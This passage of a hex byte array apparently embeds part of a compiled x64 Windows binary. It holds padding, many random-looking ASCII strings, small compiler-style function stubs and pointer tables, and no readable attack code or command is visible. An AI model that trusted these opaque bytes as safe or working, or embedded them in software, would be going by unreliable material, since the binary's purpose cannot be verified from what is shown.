	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x28, 0x39, 0x78, 0x24,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x6D, 0x56, 0x66, 0x3B, 0x6C, 0x6C, 0x69, 0x28, 0x2D, 0x2A, 0x2B, 0x6B,
	0x5E, 0x3A, 0x31, 0x33, 0x46, 0x28, 0x5D, 0x44, 0x2C, 0x28, 0x3F, 0x29,
	0x37, 0x57, 0x79, 0x28, 0x3F, 0x68, 0x00, 0xCC, 0x40, 0x7B, 0x76, 0x2E,
	0x24, 0x25, 0x61, 0x2D, 0x6B, 0x5E, 0x4C, 0x4A, 0x70, 0x23, 0x00, 0xCC,
	0x45, 0x39, 0x65, 0x42, 0x79, 0x69, 0x79, 0x79, 0x5A, 0x62, 0x6B, 0x78,
	0x4A, 0x55, 0x00, 0xCC, 0x79, 0x53, 0x37, 0x21, 0x4E, 0x78, 0x30, 0x3E,
	0x47, 0x3C, 0x6F, 0x38, 0x65, 0x42, 0x38, 0x4C, 0x36, 0x63, 0x4E, 0x3F,
	0x41, 0x70, 0x3E, 0x4C, 0x2A, 0x44, 0x3F, 0x52, 0x00, 0xCC, 0xCC, 0xCC,
	0x72, 0x66, 0x57, 0x50, 0x5B, 0x67, 0x42, 0x41, 0x39, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x64, 0x4A, 0x72, 0x4D, 0x44, 0x6C, 0x62, 0x4A,
	0x73, 0x54, 0x41, 0x32, 0x6E, 0x00, 0xCC, 0xCC, 0x55, 0x39, 0x36, 0x43,
	0x6A, 0x71, 0x51, 0x56, 0x6E, 0x35, 0x4A, 0x76, 0x63, 0x34, 0x38, 0x52,
	0x4B, 0x65, 0x70, 0x49, 0x5A, 0x59, 0x71, 0x75, 0x71, 0x61, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x33, 0x45, 0x53, 0x66, 0x49, 0x44, 0x6C, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x7B, 0x6F, 0x23,
	0x44, 0x6A, 0x23, 0x30, 0x59, 0x6B, 0x4C, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0x78, 0x24, 0x20, 0x20, 0x20, 0x73, 0x28, 0x61, 0x73, 0x53, 0x5E, 0x48,
	0x34, 0x3A, 0x49, 0x48, 0x68, 0x62, 0x58, 0x60, 0x00, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x31, 0x35, 0x55, 0x55,
	0x30, 0x55, 0x78, 0x7A, 0x20, 0x20, 0x20, 0x6F, 0x40, 0x47, 0x3A, 0x42,
	0x72, 0x50, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x50, 0x45, 0x6E, 0x4C, 0x6C, 0x6D, 0x70, 0x51,
	0x31, 0x79, 0x78, 0x76, 0x00, 0xCC, 0xCC, 0xCC, 0x4E, 0x76, 0x72, 0x57,
	0x52, 0x30, 0x6E, 0x77, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x4F, 0x67, 0x57, 0x79, 0x2C, 0x57, 0x31, 0x64, 0x33, 0x2A, 0x7C, 0x77,
	0x00, 0xCC, 0xCC, 0xCC, 0x64, 0x65, 0x4E, 0x67, 0x29, 0x41, 0x55, 0x4D,
	0x2C, 0x42, 0x76, 0x21, 0x75, 0x33, 0x2C, 0x3B, 0x53, 0x56, 0x66, 0x4B,
	0x56, 0x39, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x4A, 0x69, 0x4E, 0x36, 0x67, 0x44, 0x36, 0x71, 0x32, 0x51, 0x54, 0x59,
	0x4B, 0x4F, 0x4B, 0x66, 0x59, 0x6D, 0x33, 0x71, 0x4B, 0x5A, 0x73, 0x62,
	0x38, 0x49, 0x53, 0x4B, 0x46, 0x78, 0x4A, 0x56, 0x64, 0x65, 0x32, 0x33,
	0x37, 0x70, 0x5A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x6C, 0x77, 0x49, 0x55, 0x52, 0x58, 0x31, 0x47, 0x4D, 0x6B, 0x33, 0x54,
	0x75, 0x4C, 0x57, 0x74, 0x43, 0x5A, 0x39, 0x78, 0x6E, 0x5A, 0x32, 0x33,
	0x68, 0x59, 0x59, 0x53, 0x48, 0x50, 0x7A, 0x41, 0x31, 0x6D, 0x51, 0x37,
	0x68, 0x47, 0x59, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x32, 0x67, 0x31, 0x36, 0x54, 0x60, 0x6D, 0x7C, 0x3A, 0x71, 0x79, 0x4B,
	0x00, 0xCC, 0xCC, 0xCC, 0x0A, 0x0A, 0x20, 0x0A, 0x09, 0x0D, 0x0A, 0x20,
	0x09, 0x09, 0x0A, 0x20, 0x20, 0x00, 0xCC, 0xCC, 0x46, 0x70, 0x6B, 0x6A,
	0x41, 0x6C, 0x73, 0x64, 0x42, 0x78, 0x2C, 0x4E, 0x50, 0x5A, 0x64, 0x4C,
	0x31, 0x78, 0x21, 0x6A, 0x26, 0x55, 0x5E, 0x5D, 0x44, 0x51, 0x48, 0x74,
	0x52, 0x7C, 0x52, 0x00, 0x66, 0x53, 0x4A, 0x52, 0x77, 0x37, 0x33, 0x64,
	0x68, 0x79, 0x56, 0x69, 0x72, 0x6A, 0x7A, 0x48, 0x42, 0x34, 0x4E, 0x48,
	0x4C, 0x56, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x53, 0x38, 0x76, 0x3F, 0x73, 0x4D, 0x2B, 0x55, 0x3F, 0x2D, 0x57, 0x2E,
	0x3B, 0x61, 0x6E, 0x23, 0x31, 0x58, 0x7D, 0x75, 0x56, 0x63, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x2C, 0x49, 0x30, 0x57,
	0x48, 0x70, 0x33, 0x2D, 0x24, 0x33, 0x76, 0x5A, 0x4C, 0x2C, 0x57, 0x43,
	0x7E, 0x5B, 0x43, 0x57, 0x75, 0x29, 0x51, 0x45, 0x37, 0x3E, 0x57, 0x68,
	0x37, 0x32, 0x3D, 0x51, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x79, 0x33, 0x54, 0x6D,
	0x57, 0x66, 0x75, 0x72, 0x68, 0x6B, 0x52, 0x42, 0x32, 0x38, 0x78, 0x76,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x25, 0x65, 0x54, 0x75, 0x68, 0x52, 0x3C, 0x33,
	0x4E, 0x79, 0x59, 0x48, 0x24, 0x33, 0x3D, 0x6D, 0x47, 0x71, 0x3E, 0x69,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x3C, 0x45, 0x3C, 0x3E, 0x47, 0x6D, 0x2B, 0x7D, 0x3D, 0x66, 0x68,
	0x52, 0x6E, 0x6F, 0x2E, 0x3C, 0x2C, 0x6D, 0x40, 0x29, 0x53, 0x49, 0x7C,
	0x4D, 0x36, 0x71, 0x54, 0x3A, 0x00, 0xCC, 0xCC, 0x4F, 0x6E, 0x30, 0x67,
	0x6B, 0x70, 0x6F, 0x78, 0x4A, 0x41, 0x6C, 0x31, 0x67, 0x67, 0x66, 0x41,
	0x39, 0x59, 0x69, 0x52, 0x44, 0x52, 0x57, 0x38, 0x4B, 0x4C, 0x64, 0x56,
	0x76, 0x50, 0x38, 0x64, 0x34, 0x55, 0x6B, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x5A, 0x39, 0x76, 0x54,
	0x42, 0x4C, 0x46, 0x30, 0x76, 0x5A, 0x66, 0x68, 0x66, 0x76, 0x70, 0x51,
	0x69, 0x4C, 0x71, 0x48, 0x52, 0x70, 0x34, 0x37, 0x65, 0x4E, 0x67, 0x6C,
	0x51, 0x4C, 0x6D, 0x58, 0x47, 0x56, 0x6E, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x3E, 0x7B, 0x6B, 0x33,
	0x5D, 0x39, 0x6C, 0x6F, 0x55, 0x28, 0x3A, 0x50, 0x26, 0x42, 0x56, 0x36,
	0x2D, 0x2B, 0x7D, 0x5A, 0x67, 0x23, 0x4F, 0x4C, 0x5E, 0x32, 0x3D, 0x29,
	0x00, 0xCC, 0xCC, 0xCC, 0x75, 0x75, 0x71, 0x62, 0x45, 0x72, 0x20, 0x62,
	0x46, 0x75, 0x34, 0x54, 0x33, 0x64, 0x43, 0x49, 0x48, 0x70, 0x6D, 0x63,
	0x46, 0x46, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x30, 0x43, 0x46, 0x6D, 0x38, 0x45, 0x51, 0x4C, 0x73, 0x79, 0x52, 0x37,
	0x00, 0xCC, 0xCC, 0xCC, 0x54, 0x37, 0x68, 0x38, 0x75, 0x54, 0x35, 0x56,
	0x4D, 0x75, 0x64, 0x71, 0x39, 0x6D, 0x51, 0x42, 0x47, 0x6F, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x52, 0x53, 0x7A, 0x6E, 0x6D, 0x52, 0x53, 0x68, 0x4B, 0x62, 0x6B, 0x4B,
	0x56, 0x33, 0x64, 0x65, 0x31, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x42, 0x6F, 0x77, 0x43,
	0x32, 0x63, 0x48, 0x31, 0x59, 0x70, 0x43, 0x62, 0x68, 0x31, 0x75, 0x47,
	0x62, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x25, 0x4A, 0x2C, 0x77, 0x32, 0x53, 0x55, 0x4B,
	0x53, 0x37, 0x58, 0x75, 0x62, 0x44, 0x00, 0xCC, 0x4A, 0x6E, 0x54, 0x6F,
	0x6D, 0x63, 0x6D, 0x41, 0x36, 0x56, 0x4B, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0x58, 0x4E, 0x58, 0x69, 0x4E, 0x75, 0x34, 0x6A, 0x52, 0x72, 0x39, 0x72,
	0x31, 0x4C, 0x49, 0x4C, 0x75, 0x55, 0x39, 0x4C, 0x78, 0x4E, 0x49, 0x4B,
	0x34, 0x50, 0x6B, 0x6D, 0x00, 0xCC, 0xCC, 0xCC, 0x41, 0x4E, 0x40, 0x53,
	0x53, 0x7B, 0x43, 0x7C, 0x23, 0x64, 0x4D, 0x77, 0x59, 0x4C, 0x53, 0x68,
	0x2A, 0x23, 0x59, 0x75, 0x71, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x63, 0x41, 0x47, 0x4B, 0x65, 0x52, 0x67, 0x4F,
	0x58, 0x72, 0x73, 0x52, 0x6E, 0x75, 0x36, 0x48, 0x20, 0x55, 0x50, 0x4F,
	0x39, 0x65, 0x64, 0x59, 0x6A, 0x4C, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x5A, 0x30, 0x58, 0x4A, 0x4F, 0x69, 0x57, 0x78, 0x00, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x73, 0x77, 0x53, 0x61, 0x31, 0x59, 0x6A,
	0x4F, 0x68, 0x36, 0x6B, 0x63, 0x66, 0x00, 0xCC, 0x68, 0x4C, 0x4E, 0x64,
	0x76, 0x51, 0x6E, 0x56, 0x39, 0x71, 0x57, 0x63, 0x6F, 0x73, 0x43, 0x4D,
	0x6E, 0x57, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x6F, 0x30, 0x70, 0x37, 0x30, 0x6D, 0x4A, 0x55,
	0x67, 0x41, 0x7A, 0x4B, 0x64, 0x00, 0xCC, 0xCC, 0x38, 0x59, 0x6A, 0x37,
	0x67, 0x4D, 0x6C, 0x57, 0x6C, 0x6B, 0x57, 0x62, 0x50, 0x37, 0x74, 0x54,
	0x4F, 0x56, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x57, 0x6B, 0x58, 0x6D, 0x42, 0x34, 0x45, 0x51,
	0x62, 0x4C, 0x56, 0x4F, 0x59, 0x43, 0x72, 0x6F, 0x00, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x66, 0x57, 0x32, 0x78, 0x6F, 0x71, 0x38, 0x61, 0x56, 0x77, 0x24, 0x69,
	0x47, 0x00, 0xCC, 0xCC, 0x7B, 0x75, 0x50, 0x45, 0x28, 0x38, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x34, 0x43, 0x38, 0x54,
	0x79, 0x31, 0x34, 0x6A, 0x77, 0x31, 0x33, 0x4E, 0x64, 0x00, 0xCC, 0xCC,
	0x6B, 0x34, 0x45, 0x75, 0x38, 0x33, 0x37, 0x68, 0x63, 0x4C, 0x6E, 0x4E,
	0x46, 0x6D, 0x6E, 0x5A, 0x79, 0x74, 0x50, 0x43, 0x54, 0x37, 0x31, 0x76,
	0x68, 0x56, 0x38, 0x47, 0x47, 0x78, 0x74, 0x4E, 0x75, 0x6F, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x34, 0x31, 0x73, 0x55, 0x35, 0x53, 0x28, 0x5A, 0x48, 0x73, 0x3B, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0x6E, 0x73, 0x5A, 0x74, 0x58, 0x62, 0x76, 0x56,
	0x63, 0x31, 0x28, 0x76, 0x3A, 0x00, 0xCC, 0xCC, 0x6D, 0x46, 0x50, 0x51,
	0x39, 0x6A, 0x73, 0x66, 0x5A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x49, 0x6F, 0x51, 0x4C, 0x71, 0x54, 0x6F, 0x70, 0x34, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x4F, 0x26, 0x32, 0x40, 0x4B, 0x66, 0x5F, 0x3B,
	0x3D, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x0A, 0x09, 0x20, 0x09,
	0x20, 0x20, 0x0A, 0x20, 0x20, 0x09, 0x20, 0x20, 0x0A, 0x09, 0x0A, 0x20,
	0x20, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x42, 0x61, 0x4F, 0x55, 0x30, 0x32, 0x39, 0x46,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x5A, 0x7A, 0x32, 0x6C,
	0x33, 0x69, 0x6D, 0x75, 0x56, 0x53, 0x57, 0x43, 0x6E, 0x70, 0x78, 0x00,
	0x63, 0x5D, 0x4C, 0x25, 0x77, 0x63, 0x32, 0x4E, 0x3E, 0x3F, 0x7A, 0x6E,
	0x00, 0xCC, 0xCC, 0xCC, 0x6E, 0x78, 0x58, 0x53, 0x4A, 0x41, 0x52, 0x66,
	0x30, 0x45, 0x43, 0x48, 0x31, 0x62, 0x50, 0x56, 0x61, 0x37, 0x66, 0x4F,
	0x67, 0x54, 0x34, 0x46, 0x52, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x56, 0x48, 0x70, 0x45, 0x31, 0x6A, 0x32, 0x70, 0x65, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x52, 0x4B, 0x57, 0x43, 0x6D, 0x77, 0x67, 0x31,
	0x44, 0x52, 0x61, 0x38, 0x43, 0x79, 0x00, 0xCC, 0x35, 0x4F, 0x46, 0x57,
	0x46, 0x50, 0x6E, 0x64, 0x79, 0x49, 0x41, 0x4F, 0x4C, 0x34, 0x4A, 0x6D,
	0x54, 0x6B, 0x4D, 0x44, 0x46, 0x48, 0x4B, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B,
	0xEA, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x40, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xEA, 0xB8, 0x01, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3, 0xCC, 0x40, 0x55, 0x48,
	0x83, 0xEC, 0x20, 0x48, 0x8B, 0xEA, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48,
	0x83, 0xC4, 0x20, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x40, 0x55, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xEA, 0xB8, 0x01, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0xC3, 0xCC, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD8, 0x10, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xE2, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEC, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF6, 0x10, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x0E, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x1C, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2A, 0x11, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x58, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x11, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x84, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x9E, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x11, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xC8, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xDE, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x90, 0x96, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
	0xB0, 0x9A, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x90, 0x96, 0x00, 0x40,
	0x01, 0x00, 0x00, 0x00, 0xD0, 0x9A, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
	0xD0, 0x9A, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xA0, 0x53, 0x00, 0x00, 0xE0, 0x53, 0x00, 0x00,
	0x20, 0x57, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00, 0x80, 0x7A, 0x00, 0x00,
	0xA0, 0x8F, 0x00, 0x00, 0x90, 0x96, 0x00, 0x00, 0x30, 0x98, 0x00, 0x00,
	0xB0, 0x99, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x80, 0xA0, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC1, 0x48, 0xC1, 0xE8, 0x0C, 0x48,
